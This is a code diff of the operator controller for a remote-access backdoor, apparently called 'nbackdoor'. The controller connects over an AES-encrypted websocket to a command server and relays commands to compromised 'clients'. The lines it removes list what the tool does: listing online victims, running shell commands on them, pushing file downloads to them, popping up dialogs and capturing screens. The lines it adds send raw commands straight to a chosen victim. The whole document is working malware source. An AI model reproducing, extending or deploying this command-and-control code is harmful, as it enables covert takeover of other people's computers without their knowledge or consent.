@@ -15,14 +15,19 @@ from _docpot import docopt
 __author__ = 'nekocode'
 
 
+def get_data(msg):
+    return b64decode(msg['data'])
+
+
 class ControllerClient:
     def __init__(self):
-        self.SERVER_HOST = 'ws://192.168.10.3:8888'
+        self.SERVER_HOST = 'ws://localhost:8888'
         self.HOST_NAME = hostname()
         self.UUID = str(uuid.uuid5(uuid.NAMESPACE_DNS, str(uuid.getnode())))
         self.IV = '\0' * AES.block_size
         self.SECRET = os.urandom(32)
         self.ws = None
+        self.to_client = None
 
         self.exit = False
         init(autoreset=True)
@@ -34,7 +39,10 @@ class ControllerClient:
                 self.ws = create_connection(self.SERVER_HOST)
                 print 'Connected!'
 
-                pwd = pwd_input('Enter the password: ')
+                # =====================
+                # ======= Login =======
+                # =====================
+                pwd = raw_input('Enter the password: ')
 
                 try:
                     sercret_msg = {'uuid': self.UUID, 'host_name': self.HOST_NAME, 'secret': b64encode(self.SECRET),
@@ -47,133 +55,50 @@ class ControllerClient:
                 msg = json.loads(self.decrypt(self.ws.recv()))
                 if 'data' not in msg:
                     continue
-                data = msg['data']
+                data = get_data(msg)
                 if data == 'login failed':
                     print Fore.RED + 'Login failed.'
                     self.exit = True
                 else:
                     print Fore.RED + 'Login success!'
 
+                # =======================
+                # ======= Command =======
+                # =======================
                 while not self.exit:
-                    input_str = raw_input(Back.RED + 'nbackdoor:' + Back.RESET + ' ')
-                    msg = self.command_to_msg(input_str)
+                    input_str = raw_input(Back.RED + 'nbackdoor' +
+                                          ((' in ' + self.to_client + '') if self.to_client else '') +
+                                          ':' + Back.RESET + ' ')
+                    if input_str == 'exit':
+                        self.exit = True
+                        break
 
-                    if msg:
-                        self.ws.send(self.encrypt(msg))
-                        msg = json.loads(self.decrypt(self.ws.recv()))
-                        if 'data' in msg:
-                            data = msg['data']
-                            print Fore.GREEN + data
+                    msg = json.dumps({'cmd': b64encode(input_str)})
+                    self.ws.send(self.encrypt(msg))
+
+                    msg_recv = json.loads(self.decrypt(self.ws.recv()))
+
+                    if 'data' in msg_recv:
+                        while 'end' not in msg_recv:
+                            data = get_data(msg_recv)
+                            print data
+
+                            msg_recv = self.decrypt(self.ws.recv())
+                    elif 'connected' in msg_recv:
+                        self.to_client = msg_recv['connected']
+                        print 'Connected to client ' + self.to_client + '.\n'
+                    elif 'disconnected' in msg_recv:
+                        self.to_client = None
+                        print 'Disconnected success.\n'
 
                 self.ws.close()
 
             except Exception as e:
-                if e.message:
-                    print e.message
+                print e.message if e.message else 'unkown err'
+
                 if self.ws:
                     self.ws.close()
                 time.sleep(3)
-
-    def command_to_msg(self, input_str):
-        input_array = shlex.split(input_str)
-        command_str = input_array[0]
-        arguments_str = input_array[1:]
-
-        if command_str == 'help':
-            print """Command List:
-
-help            show the command list
-list            list online clients
-jobs            list all jobs
-cmd             send cmd to client
-download        download file to client
-dialog          show message to client
-screen
-exit            quit nbackdoor controller
-"""
-            return None
-
-        elif command_str == 'list':
-            doc = """Usage: list
-
--h --help       show this
-"""
-            try:
-                docopt(doc, argv=arguments_str, help=True, version=None, options_first=False)
-                return json.dumps({'cmd': command_str})
-            except SystemExit as e:
-                print e.message
-                return None
-
-        elif command_str == 'jobs':
-            doc = """Usage: job
-
--h --help       show this
-"""
-            try:
-                docopt(doc, argv=arguments_str, help=True, version=None, options_first=False)
-                return json.dumps({'cmd': command_str})
-            except SystemExit as e:
-                print e.message
-                return None
-
-        elif command_str == 'cmd':
-            doc = """Usage: cmd CLINET_ID COMMAND
-
-CLINET_ID       user command "list" to get clinet_id
-COMMAND         cmd command to execute
--h --help       show this
-"""
-            try:
-                args = docopt(doc, argv=arguments_str, help=True, version=None, options_first=False)
-                return json.dumps({'cmd': 'exec_cmd', 'to': args['CLINET_ID'],
-                                   'cmd_to_exec': b64encode(args['COMMAND'])})
-            except SystemExit as e:
-                print e.message
-                return None
-
-        elif command_str == 'download':
-            doc = """Usage: download CLINET_ID URL FILENAME
-
-CLINET_ID       user command "list" to get clinet_id
-COMMAND         cmd command to execute
--h --help       show this
-"""
-            try:
-                args = docopt(doc, argv=arguments_str, help=True, version=None, options_first=False)
-                return json.dumps({'cmd': command_str, 'to': args['CLINET_ID'],
-                                   'url': args['URL'], 'filename': args['FILENAME']})
-            except SystemExit as e:
-                print e.message
-                return None
-
-        elif command_str == 'dialog':
-            doc = """Usage: dialog CLINET_ID DIALOG_CONTENT [DIALOG_TITLE]
-
-CLINET_ID       user command "list" to get clinet_id
-DIALOG_CONTENT  content to show
-DIALOG_TITLE    dialog title
--h --help       show this
-"""
-            try:
-                args = docopt(doc, argv=arguments_str, help=True, version=None, options_first=False)
-                return json.dumps({'cmd': command_str, 'to': args['CLINET_ID'],
-                                   'content': b64encode(args['DIALOG_CONTENT']),
-                                   'title': None if not args['DIALOG_TITLE'] else b64encode(args['DIALOG_TITLE'])})
-            except SystemExit as e:
-                print e.message
-                return None
-
-        elif command_str == 'screen':
-            return json.dumps({'cmd': command_str})
-
-        elif command_str == 'exit':
-            self.exit = True
-            return None
-
-        else:
-            print 'Not available command.\n'
-            return None
 
     def encrypt(self, text):
         encryptor = AES.new(self.SECRET, AES.MODE_CFB, self.IV)
